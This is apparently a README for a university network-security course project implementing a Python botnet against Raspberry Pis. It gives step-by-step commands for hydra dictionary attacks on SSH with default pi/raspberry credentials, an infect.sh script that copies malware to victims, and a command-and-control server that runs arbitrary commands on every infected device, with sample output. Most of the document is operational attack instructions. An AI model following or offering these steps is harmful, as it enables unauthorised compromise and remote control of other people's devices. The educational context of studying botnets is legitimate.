# Raspberry Pi Botnet

Implimentation of botnet malware designed to infect and control a set of raspberry PIs. For educational purposes only, as a final project of University of Windsor's 60-467 network security course.

This project includes 2 approaches to implimenting a botnet using python: Via SSH and via raw sockets.

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.

### Prerequisites

- hydra (For performing a dictionary attack on target Rasp PI SSH servers)
- python3
- pip3 (For installing pexpect)
- pexpect (For the SSH botnet)


### Installing

1.  Install hydra, and python3
```
$ sudo apt install hydra python3
```

2.  Install pip3, so that we can use it to install pexpect
```
$ sudo apt install pip3
```

3.  Install pexpect
```
$ pip3 install pexpect
```

## Running the SSH botnet

The SSH botnet uses pexpect to handle SSH connections. It assumes that all of the target hosts are running an SSH server on port 22, that the attacking machine can reach the target raspberry PI, and that there exists a user on each target machine with the default login for a raspberry pi (pi/raspberry).

Usage:
```
$ python3 cnc.py [IP addresses or hostnames of target Raspberry PIs]
```

Example:
```
$ python3 cnc.py 192.168.0.50
Adding clients...
	Client: 192.168.0.50 
Number of clients connected: 1
$ pwd
[*]Output from 192.168.0.50
[+]pwd
/home/pi

$ ls
[*]Output from 192.168.0.50
[+]ls
client   Documents  Music      Pictures  python_games  tmp
Desktop  Downloads  myScripts  Public    Templates     Videos
```

## Running the Socket botnet

The socket botnet uses sockets in python to send commands to the targets. It does not require standard user login for the target hosts (pi/raspberry), or for the target to be running SSH on port 22. Once the client has been infected, it will initiate communication with the command and control server (which can be remote, unlike the SSH botnet).

1. Modify the IP and port of the infection script to reflect the IP and port of your remote command and control server. This will be the IP/port that each target PI will attempt to connect to, in order to recieve commands.
```
$ vim infect.sh
CNC_IP=1.1.1.1
CNC_PORT=50000
```

2. Start the command and control server on the remote host. It is recommended to run this in tmux or screen to maintain a persistent TTY (just in case you close the SSH session to your remote host).
```
user@remote_server $ python3 server.py [IP to bind to] [Port to bind to]

# Example:
# $ python3 server.py 1.1.1.1 50000
Binding on [1.1.1.1]:50000...
```

3. Infect your victims. This will copy the malware to the victim, and the client code will begin executing on the target PI. Once infected, they will attempt to communicate with the remote server.
```
# Show usage:
$ ./infect.sh

# Example usages:
$ ./infect.sh -t [victim IP]
$ ./infect.sh -l [Alternate login] -p [Alternate password] -t [victim IP]
$ ./infect.sh -L [Alternate login file] -P [Alternate password dictionary] -t [victim IP]

# Examples:
$ ./infect.sh -t 2.2.2.2
$ ./infect.sh -t 2.2.2.2 -l alternate_username -p alternate_password
$ ./infect.sh -t 2.2.2.2 -L username_list.txt -p common_passwords.txt
```

4. On the remote host, you should see clients connected. From here, you can send commands from the same TTY/process from step 2.
```
# TTY from step 2:
$ Client connected: ('1.1.1.1', 37280)->('2.2.2.2', 50000)
$ !exec ls
Sending command [ls] to 1 clients...
Sending to: ('2.2.2.2', 50002)
$ !exec ls -lah
Sending command [ls -lah] to 1 clients...
Sending to: ('2.2.2.2', 50002)
```
These commands execute on all connected target hosts. Output can be seen on the target if you were to run the client code (client/run.py) manually.

## Built With

* [hydra](http://sectools.org/tool/hydra/) - Used for password cracking 
* [pexpect](http://pexpect.sourceforge.net/pxssh.html) - Used for handling SSH connections via python 

## Contributing

Since this project is completed and submitted, no further work is expected to be done on the project. Feel free to fork the repo if you're interested in continuing the work here.

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## Acknowledgments
* My group members, Ryan and Paul, for their contributions.
* Sherif Saad Ahmed, for the leadership and teaching of the course.
* [Linux Journal](http://www.linuxjournal.com/content/validating-ip-address-bash-script) for the bash script to validate IP addresses.
* [Charles Leifer](http://charlesleifer.com/blog/simple-botnet-written-python/) for inspiration, and for help with understanding raw python sockets.
* [bjacharya at cybrary](https://www.cybrary.it/0p3n/python-programming-hackers-part-6-creating-ssh-botnet/) for inspiration, and for help with pexpect library.
* Thanks to PurpleBooth for the github [README template](https://gist.github.com/PurpleBooth/109311bb0361f32d87a2)
